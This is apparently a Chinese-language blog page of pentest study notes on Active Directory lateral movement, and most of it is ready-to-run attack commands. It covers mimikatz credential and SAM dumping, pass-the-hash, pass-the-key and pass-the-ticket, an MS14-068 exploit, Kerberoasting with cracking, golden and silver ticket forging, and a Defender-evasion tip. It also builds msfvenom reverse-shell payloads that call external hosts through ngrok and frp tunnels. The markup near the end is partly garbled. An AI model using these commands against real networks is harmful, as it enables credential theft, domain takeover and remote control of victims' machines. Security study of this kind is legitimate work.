+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz</span><br><span class="line">privilege::debug        </span><br><span class="line"># NTLM</span><br><span class="line">sekurlsa::logonPasswords      </span><br><span class="line"># AES</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">总结：KB2871997补丁后的影响</span><br><span class="line">https://www.freebuf.com/column/220740.html</span><br><span class="line">PTH:打补丁前任意用户都可以连接，打了补丁后只能administrator 用户才可以连接</span><br><span class="line">PTK:打补丁前不能连接，打补丁后才能任意用户都可以连接(采用aes256连接)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1631613860069-8e221a7f-cc0e-42a1-bca6-f539628e6ade.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PTT</span><br><span class="line">PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos 协议进行攻击的，这里就介绍三种常见的攻击方法:MS14-068，Golden ticket，SILVER ticket。简单来说就是将连接合法的票据注入到内存中实现连接。</span><br><span class="line"></span><br><span class="line">Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术</span><br><span class="line"></span><br><span class="line">MS14-068基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="域横向移动PTH传递-mimikatz"><a href="#域横向移动PTH传递-mimikatz" class="headerlink" title="域横向移动PTH传递-mimikatz"></a>域横向移动PTH传递-mimikatz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PTH-ntlm传递</span><br><span class="line">mimikatz</span><br><span class="line">（提升权限） privilege::debug</span><br><span class="line">（获取ntml） sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">未打补丁下的工作组及域连接：</span><br><span class="line">（域内用户）sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 </span><br><span class="line">（本地用户）sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c</span><br><span class="line">sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">弹出cmd窗口</span><br><span class="line">net use \\192.168.3.21\c$</span><br><span class="line">dir \\192.168.3.21\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="域横向移动PTK传递-mimikatz"><a href="#域横向移动PTK传递-mimikatz" class="headerlink" title="域横向移动PTK传递-mimikatz"></a>域横向移动PTK传递-mimikatz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打补丁后的工作组或域的连接</span><br><span class="line">sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="域横向移动PTT传递-ms14068-amp-kekeo-amp-本地"><a href="#域横向移动PTT传递-ms14068-amp-kekeo-amp-本地" class="headerlink" title="域横向移动PTT传递-ms14068 &amp;kekeo&amp;本地"></a>域横向移动PTT传递-ms14068 &amp;kekeo&amp;本地</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种利用漏洞:能实现普通用户直接获取域控system权限</span><br><span class="line">MS14-068 powershell执行</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前 sid </span><br><span class="line">whoami/user</span><br><span class="line"># 查看凭证列表</span><br><span class="line">klist </span><br><span class="line"># 查看当前机器凭证</span><br><span class="line">kerberos::list</span><br><span class="line"># mimikatz 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">kerberos::purge</span><br><span class="line"># 删除所有凭证</span><br><span class="line">klist purge</span><br><span class="line"># 利用 ms14-068 生成 TGT 数据</span><br><span class="line">MS14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331 -2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45</span><br><span class="line"># 将票据注入到内存中</span><br><span class="line">kerberos::ptc 票据文件</span><br><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit</span><br><span class="line"># 查看域名</span><br><span class="line">net time /domain</span><br><span class="line"># 利用</span><br><span class="line">dir \\OWA20210CN-God.god.org\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二种利用工具kekeo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 生成票据</span><br><span class="line">kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span><br><span class="line"># 导入票据</span><br><span class="line">kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi</span><br><span class="line"># 查看凭证</span><br><span class="line">klist</span><br><span class="line"># 利用 net use 载入</span><br><span class="line">dir \\OWA20210CN-God.god.org\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="域横向-SPN-amp-RDP"><a href="#域横向-SPN-amp-RDP" class="headerlink" title="域横向 SPN&amp;RDP"></a>域横向 SPN&amp;RDP</h1><h2 id="域横向移动RDP传递-Mimikatz"><a href="#域横向移动RDP传递-Mimikatz" class="headerlink" title="域横向移动RDP传递-Mimikatz"></a>域横向移动RDP传递-Mimikatz</h2><p>除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作RDP协议连接:判断对方远程桌面服务是否开启(默认:3389)，端口扫描判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RDP明文密码连接</span><br><span class="line">windows:</span><br><span class="line">mstsc</span><br><span class="line">mstsc.exe /console /v:192.168.3.21 /admin</span><br><span class="line">Linux:</span><br><span class="line">rdesktop 192.168.3.21:3389</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RDP密文Hash链接</span><br><span class="line">windows server需要开启Resticted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7和Windows Server2008 R2安装了2871997、2973351补丁也支持;开启命令:</span><br><span class="line"></span><br><span class="line">REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启后运行</span><br><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 “/run:mstsc.exe /restrictedadmin”</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="域横向移动SPN服务-探针-请求-破解-重写"><a href="#域横向移动SPN服务-探针-请求-破解-重写" class="headerlink" title="域横向移动SPN服务-探针,请求,破解,重写"></a>域横向移动SPN服务-探针,请求,破解,重写</h2><p>黑客可以使用有效的域用户的身份验证票证（TGT)）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RCA_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerhernat攻和间击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">探针</span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -q */* | findstr &quot;MSSQL&quot;</span><br><span class="line">请求</span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;</span><br><span class="line">mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</span><br><span class="line">导出</span><br><span class="line">mimikatz.exe &quot;kerberos::list /export&quot;</span><br><span class="line">破解</span><br><span class="line">python tgsrepcrack.py passwd.txt xxxx.kirbi</span><br><span class="line">python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span><br><span class="line">重写</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="域横向内网漫游Socks代理隧道技术"><a href="#域横向内网漫游Socks代理隧道技术" class="headerlink" title="域横向内网漫游Socks代理隧道技术"></a>域横向内网漫游Socks代理隧道技术</h1><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220324181713883-1648902585363.png" alt="image-20220324181713883"></p>
+<p>1.内外网简单知识<br>2.内网1和内网2通信问题<br>3.正向反向协议通信连接问题<br>控制端连接被控制端为正向<br>4.内网穿透代理隧道技术说明</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1633082373154-ffa7b109-6ace-41f5-a049-838bb9ff396a.png" alt="image.png"></p>
+<h2 id="内网穿透Ngrok测试演示-两个内网通讯上线"><a href="#内网穿透Ngrok测试演示-两个内网通讯上线" class="headerlink" title="内网穿透Ngrok测试演示-两个内网通讯上线"></a>内网穿透Ngrok测试演示-两个内网通讯上线</h2><p>Linux是控制端，运行ngrok里的sunny，然后用木马生成器msfvenom监听xiaodisec.free.idcfengye.com，监听以后</p>
+<p>配置控制端的ip和端口即可成功监听。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.注册-购买-填写-确认</span><br><span class="line">http://www.ngrok.cc/</span><br><span class="line">https://www.natfrp.com/</span><br><span class="line">协议: http本地端口:192.168.76.132:4444</span><br><span class="line">⒉.测试:内网1执行后门-免费主机处理-内网2监听-内网2接受器</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./sunny clientid aa0676878c162ffc</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.76.132</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内网穿透Frp自建跳板测试-两个内网通讯上线"><a href="#内网穿透Frp自建跳板测试-两个内网通讯上线" class="headerlink" title="内网穿透Frp自建跳板测试-两个内网通讯上线"></a>内网穿透Frp自建跳板测试-两个内网通讯上线</h2><p>自行搭建的，方便修改，成本低，使用多样化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#服务端</span><br><span class="line">1.服务端</span><br><span class="line">修改frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 6677</span><br><span class="line">2.启动服务器</span><br><span class="line">chmod 755 frps(获取权限)</span><br><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#控制端</span><br><span class="line">1.控制端修改</span><br><span class="line">修改frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 你的云主机 ip</span><br><span class="line">server_port = 6677 #frpc 工作端口，必须和上面 frps 保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1a</span><br><span class="line">local_port = 5555 #转发给本机的 5555</span><br><span class="line">remote_port = 6000 #服务端用 6000 端口转发给本机</span><br><span class="line">2.启动客户端</span><br><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">生成后门</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.160.211 lport=6000 -f exe -o frp.exe</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 127.0.0.1</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">靶机运行frp.exe文件即可</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="域横向CS-amp-MSF-联动及应急响初识"><a href="#域横向CS-amp-MSF-联动及应急响初识" class="headerlink" title="域横向CS&amp;MSF 联动及应急响初识"></a>域横向CS&amp;MSF 联动及应急响初识</h1><h2 id="MSF-amp-CobaltStrike联动Shell"><a href="#MSF-amp-CobaltStrike联动Shell" class="headerlink" title="MSF&amp;CobaltStrike联动Shell"></a>MSF&amp;CobaltStrike联动Shell</h2><p>CS-&gt;MSF<br>创建Foreign监听器<br>MSF监听模块设置对应端口地址CS执行Spawn选择监听器</p>
+<p>MSF-&gt;CS<br>CS创建监听器<br>MSF载入新模块注入设置对应地址端口执行CS等待上线<br>use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="1-IPC横向移动"><a href="#1-IPC横向移动" class="headerlink" title="1.IPC横向移动"></a>1.IPC横向移动</h2><ol>
+<li><p>条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">139、445开放</span><br><span class="line">管理员开启了默认共享</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>建立IPC命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$&quot;密码&quot;/user:用户名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>常见错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">错误号5:拒绝访问。</span><br><span class="line">错误号51: Windows 无法找到网络路径,即网络络中存在问题</span><br><span class="line">错误号53:找不到网络路径，包括IP地址错误、目标未开机,目标的 lanmanserver服务未启动、目标有防火墙（端口过滤)。</span><br><span class="line">错误号67:找不到网络名，包括 lanmanworkstation服务未启动、ipc$ 已被删除。</span><br><span class="line">错误号1219:提供的凭据与已存在的凭据集冲突。例如,已经和目标建立了ipc$,需要在删除原连接后重新进行连接。</span><br><span class="line">错误号1326:未知的用户名或错误的密码。</span><br><span class="line">错误号1792:试图登录，但是网络登录服务器没有启动，包括目标NetLogon服务未启动（连接域控制器时会出现此情况)</span><br><span class="line">错误号2242:此用户的密码已过期。例如目标机器设置了账号管理策略，强制用户定期修改密码。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>IPC交互</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.dir\\10.10.3.6\c$(列出主机文件)</span><br><span class="line">2.tasklist /S 10.10.3.6 /U xiyou1\administrator /P QWEasd1234（进程枚举）</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="2-计划任务横向移动"><a href="#2-计划任务横向移动" class="headerlink" title="2.计划任务横向移动"></a>2.计划任务横向移动</h2><h2 id="3-Windows系统散列值获取分析"><a href="#3-Windows系统散列值获取分析" class="headerlink" title="3.Windows系统散列值获取分析"></a>3.Windows系统散列值获取分析</h2><ol>
+<li><p>LM Hash和 NTLM Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windowus 操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在ntds.dit中进行加密后为散列值。Widows操作系统中的密码一般由两部分组成，一部分为LM Hash，另部分为NTLM Hash。</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="4-Mimikatz枚举NTLM-hash"><a href="#4-Mimikatz枚举NTLM-hash" class="headerlink" title="4.Mimikatz枚举NTLM hash"></a>4.Mimikatz枚举NTLM hash</h2><h3 id="通过SAM和System文件抓取密码"><a href="#通过SAM和System文件抓取密码" class="headerlink" title="通过SAM和System文件抓取密码"></a>通过SAM和System文件抓取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive    #通过reg的save选项将注册表中的SAM,System文件导出到本地磁盘</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426447_60867c8fe216c15746570.png!small" alt="1619426447_60867c8fe216c15746570.png!small?1619426448334"></p>
+<h3 id="通过读取SAM和System文件获取NTML-Hash"><a href="#通过读取SAM和System文件获取NTML-Hash" class="headerlink" title="通过读取SAM和System文件获取NTML Hash"></a>通过读取SAM和System文件获取NTML Hash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive    #文件和mimikatz放在同一目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426455_60867c97e96a2a6198ef7.png!small" alt="1619426455_60867c97e96a2a6198ef7.png!small?1619426457174"></p>
+<h3 id="Mimikatz读取SAM"><a href="#Mimikatz读取SAM" class="headerlink" title="Mimikatz读取SAM"></a>Mimikatz读取SAM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz</span><br><span class="line">privilege::debug    #提升权限</span><br><span class="line">token::elevate    #system权限</span><br><span class="line">lsadump::sam    #读取本地SAM文件，获取NTML Hash</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1619426466_60867ca238d655b2c033f.png!small" alt="1619426466_60867ca238d655b2c033f.png!small?1619426467936"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">log</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-mimikatz免杀方法"><a href="#5-mimikatz免杀方法" class="headerlink" title="5.mimikatz免杀方法"></a>5.mimikatz免杀方法</h2><ol>
+<li><p>Procdump+Mimikatz配合获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prodump导出lsass.dmp文件</span><br><span class="line">使用mimikatz导出文件中的密码</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="6-黄金票据利用"><a href="#6-黄金票据利用" class="headerlink" title="6.黄金票据利用"></a>6.黄金票据利用</h2><ol>
+<li><p>简介</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Kerberos认证中，Client通过AS（身份认证服务）认证后，AS会给Client一个Logon Session Key和TGT，而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的，所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后，就跳过AS验证，不用验证账户和密码，所以也不担心域管密码修改</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.伪造的域管理员用户名</span><br><span class="line">2.完整的域名</span><br><span class="line">3.域SID</span><br><span class="line">4.krbtgt的NTLM Hash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>信息搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">klist purge #windows命令行下清除票据</span><br><span class="line">net config workstation #获取域名信息</span><br><span class="line">nltest /dsgetdc:域名 #获取主机名</span><br><span class="line">mimikatz导出用户krbtgt的hash</span><br><span class="line">wmic useraccount get name,sid #获取krbtgt的SID值</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用mimikatz生成金票生成.kirbi文件进行保存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:systest /domain:xiyou.dayu.com /sid:S-1-5-21-1816246241-4074331134-2257350442 /krbtgt:39601ebdad1d3e960ed3712398d3ab3a /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名（任意）</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称    //不是写入内存中的命令！</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用票据</p>
+<ol>
+<li><p>登录域内普通用户，mimikatz中的kerberos::ptt功能将ticket.kirbi导入内存中：成功导入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>验证金票</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&#96;&#96;&#96;<br>dir \xiyou.xiyou.dayu.com\c$</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6. 命令执行成功！成功访问，直接通过上期技术建立计划任务即可！</span><br><span class="line"></span><br><span class="line">## 7.白银票据利用</span><br><span class="line"></span><br><span class="line">1. 简介</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>那么白银票据就是伪造的ST了，在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key解密ST，从而获得Session Key。通过Session Key解密Authenticator3，进而验证对方的身份，验证成功就让Client访问server上的指定服务了。<br>所以我们只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 攻击条件</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>域名</p>
+</li>
+<li><p>域SID(test)</p>
+</li>
+<li><p>目标服务器的FQDN</p>
+</li>
+<li><p>可利用的服务</p>
+</li>
+<li><p>服务账号的NTLM Hash</p>
+</li>
+<li><p>要伪造的用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. 信息搜集</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>1.获取域名：net config workstation<br>2.获取主机名：nltest &#x2F;dsgetdc:xiyou.dayu.com<br>3.获取域SID：whoami &#x2F;all<br>4.获取NTML Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. 开始攻击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:<NTLM Hash> &#x2F;user:&lt;要伪造的用户名，任意填写&gt; &#x2F;ptt</p>
+<p>kerberos::golden &#x2F;domain:xiyou.dayu.com &#x2F;sid:S-1-5-21-1816246241-4074331134-2257350442 &#x2F;target:xiyou.xiyou.dayu.com &#x2F;service:cifs &#x2F;rc4:f5369b5accc878d9eedfcde13578e2fc &#x2F;user:testw &#x2F;ptt</p>
+<ol>
+<li>&#x2F;domain：域名</li>
+<li>&#x2F;sid：域的SID值</li>
+<li>&#x2F;target: 域控制器全称即FQDN</li>
+<li>&#x2F;service: 需要指定相关的服务名，此处为cifs</li>
+<li>&#x2F;rc4: 域控的计算机账户ntlm hash</li>
+<li>&#x2F;user: 要伪造的用户名，任意填写<br>&#96;&#96;&#96;</li>
+</ol>
+</li>
+</ol>
